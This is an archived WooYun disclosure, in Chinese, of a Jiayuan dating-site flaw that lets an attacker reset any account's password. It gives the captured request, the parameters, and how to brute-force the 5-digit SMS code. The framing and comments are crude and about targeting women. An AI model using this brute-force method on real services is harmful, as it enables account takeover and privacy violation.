{"id": 15525, "wybug_id": "wooyun-2012-014596", "wybug_title": "光棍节屌丝的逆袭专场NO.2---世纪佳缘网修改任意妹子账号密码漏洞", "wybug_corp": "世纪佳缘", "wybug_author": "风萧萧", "wybug_date": "2012-11-10 17:37", "wybug_open_date": "2012-12-25 17:37", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "设计不当", "设计错误", "设计缺陷", "手机短信"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-11-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-11-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-11-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-12-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-12-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-12-25：\t细节向公众公开  简要描述： 欢迎各位继续观看，光棍屌丝再次逆袭！ 详细说明：  1.仍然是逻辑bug，进入世纪佳缘交友网主站：\n\n2.找到【忘记密码？】，点击进入吧！找到【点击发送验证码】，还等什么\n\n3.此时我手机上已经收到5为纯数字的短信码（区别图片验证码，这里称为短信码）为【66283】，我这里首先随意填写一个短信码66100，点击下一步，这里注意抓包\n\n4.查看POST的请求如下：\nPOST /login/dovalidate.php HTTP/1.1Host: www.jiayuan.comProxy-Connection: keep-aliveContent-Length: 59Origin: http://www.jiayuan.comX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4Content-Type: application/x-www-form-urlencodedAccept: */*Referer: http://www.jiayuan.com/login/validate.phpAccept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3Cookie: PHPSESSID=***********mail=&mobile=1*********9&validate_code=&m_code=66100&json=1\n5.上述mobile参数为需要重置的手机号码，m_code参数即为短信码，那么我这里对短信码进行爆破，由于是测试我从66100开始\n\n\n\n   漏洞证明：  6.我们可以通过返回内容的字节数进行判断是否获取到正确的短信码，在这里532个字节表示短信码不正确，而396个字节表示成功获取到短信码：\n\n7.当然也可以通过返回的内容来判断，如果短信码错误，则返回如下报错信息：\nHTTP/1.1 200 OKServer: nginxDate: Thu, 08 Nov 2012 13:36:46 GMTContent-Type: text/html; charset=UTF-8Connection: closeP3P: CP=\"CAO PSA OUR\"Expires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0Pragma: no-cacheContent-Length: 221{\"url\":\"javascript:history.back()\",\"message\":\"\\u624b\\u673a\\u9a8c\\u8bc1\\u7801\\u9519\\u8bef\",\"reason\":\"\\u624b\\u673a\\u9a8c\\u8bc1\\u7801\\u9519\\u8bef\",\"howto\":\"\\u8bf7\\u8fd4\\u56de\\u8f93\\u5165\\u6b63\\u786e\\u7684\\u9a8c\\u8bc1\\u7801\"}message、reason:手机验证码错误howto:请返回输入正确的验证码\n如果短信码正确则返回如下信息：\nHTTP/1.1 200 OKServer: nginxDate: Thu, 08 Nov 2012 13:56:08 GMTContent-Type: text/html; charset=UTF-8Connection: closeP3P: CP=\"CAO PSA OUR\"Expires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0Pragma: no-cacheContent-Length: 86{\"url\":\"\\/login\\/forgetpass.php?uid=8******5&hash=fc3da4e********5925a2e16d92668e8ec\"}\n8.那么使用获取到的短信码进行密码重置的操作吧！\n\n9.屌丝成功逆袭！\n\n\n\n   修复方案：  1.还有一个很严重的bug，一次取回账号长久可用，我的重置链接如下(怎么获得呢？)，但是评估我的账号被恶意重置以及泄露个人信息的风险，隐去最后8位：http://www.jiayuan.com/login/forgetpass.php?uid=82591085&hash=817b1ffbffd049a61f24f40df36********只要拿了上述链接，不用走重置密码的流程即可重新更新密码；2.5位纯数字短信码的爆破，即平均5万次的请求，我使用了burpsuite测试单台机器100线程，4分钟即可重置任意一个手机账号！危险啊3.短信码可以为5位纯数字，甚至可以缩短为4为纯数字；可以不设置图片验证码，甚至可以不用设置短信码的有效期。但是为什么不设置连续5次尝试失败就锁定本次密码重置的请求呢？4.求20rank，求礼物！   版权声明：转载请注明来源 风萧萧@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2012-11-13 15:47 厂商回复： 非常感谢提醒。我们会尽快修复漏洞。如果是单身，我们非常欢迎成为我们的会员，也会给作者一定的优惠服务。方便的话，请留下联系方式，或者与我们联系也可以。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-11-10 18:29 |    \t\tMetasploit \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:7        | http://www.metasploit.cn/)\t\t \n  求美女联系方式     \n     2012-11-10 18:31 |    \t\t乌帽子 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:3        | 学习黑客哪家强 | 中国山东找蓝翔 | sql...)\t\t \n  屌丝的不能改么。。    \n     2012-11-10 18:58 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  求妹纸QQ。。    \n     2012-11-10 20:15 |    \t\tSeay \t\t\t( 实习白帽子  |\t\t\t        Rank:65 漏洞数:8        )\t\t \n  碉堡    \n     2012-11-10 20:58 |    \t\tcooL \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:5        | hello word)\t\t \n  @Metasploit  求充气娃娃  ...    \n     2012-11-12 21:09 |    \t\t点点 \t\t\t( 普通白帽子  |\t\t\t        Rank:214 漏洞数:38        | 准备申请سمَـَّوُوُحخ ̷̴̐...)\t\t \n  关注    \n     2012-11-13 17:05 |    \t\tse55i0n \t\t\t( 普通白帽子  |\t\t\t        Rank:1567 漏洞数:173        )\t\t \n  好多妹纸！！    \n     2012-11-13 17:35 |    \t\td3pT1 \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:2        | 人法地，地法天，天法道，道法自然。)\t\t \n  求裤子，不要说你们都把裤子穿上了    \n     2012-11-25 17:32 |    \t\t猴子 \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:5        | 我是一只骚猴子)\t\t \n  哈哈。找到你是单身，看世纪佳缘多给力，，厂商回复直接要送妹子    \n     2012-11-25 19:07 |    \t\t风萧萧  \t\t\t( 核心白帽子 |\t\t\t        Rank:1020 漏洞数:76        | 人这一辈子总要动真格的爱上什么人)\t\t \n  @世纪佳缘 @xsser 我每次给世纪佳缘厂商发信息的时候都是提示厂商不存在啊！不是我不愿意拿礼物啊！    \n     2012-11-25 21:34 |    \t\t冷静 \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:2        )\t\t \n  @风萧萧 你需要的是基友→xsser    \n     2012-12-17 21:06 |    \t\t猴子 \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:5        | 我是一只骚猴子)\t\t \n  碉堡了。真个真心好用。    \n     2012-12-25 21:58 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  这个方法真心好诶，相信其他站点也会有类似的bug，去找找。补充下，同样的bug世纪佳缘比百合网的回应好多了哦。。    \n     2013-02-03 17:16 |    \t\tGolova \t\t\t( 路人 |\t\t\t        Rank:22 漏洞数:3        | 过去过不去的终究会过去。)\t\t \n  我是来看厂商回复的。。额。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}